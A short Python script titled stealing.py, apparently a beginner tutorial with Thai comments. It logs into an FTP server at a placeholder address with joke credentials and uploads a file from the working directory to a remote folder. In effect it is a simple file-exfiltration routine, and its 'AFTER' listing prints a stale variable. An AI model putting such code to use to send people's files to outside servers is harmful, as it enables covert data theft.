# stealing.py
# upload file hell.txt ขึ้นไปบน server 

import ftplib
import os

def Steal(filename):
	ip = 'ip ของ server'
	port = 2002
	username = 'แมวตัวเท่าหมี'
	password = 'หมีตัวเท่าแมว'

	ftp = ftplib.FTP() #ประกาศตัว FTP
	ftp.connect(ip,port) #เชื่อมต่อ
	ftp.login(username,password)

	localpath = os.getcwd()#ตำแหน่ง folder ที่กำลังรันอยู่
	mypath = '/แมวตัวเท่าหมีอ้วนหนุบหนับ' #ชื่อ folder ของตัวเองที่จะอัพขึ้น server

	ftp.cwd(mypath) #cwd change working directory

	files = ftp.nlst() #ใช้คำสั่ง nlst ตรวจสอบโฟลเดอร์และไฟล์ว่ามีอะไรอยู่บ้าง
	print('BEFORE: ',files)

	filepath = os.path.join(localpath,filename)
	fileupload = open(filepath,'rb')

	result = ftp.storbinary('STOR ' + filename,fileupload)
	print(result)

	file = ftp.nlst()
	print('AFTER: ',files)

Steal('test.txt')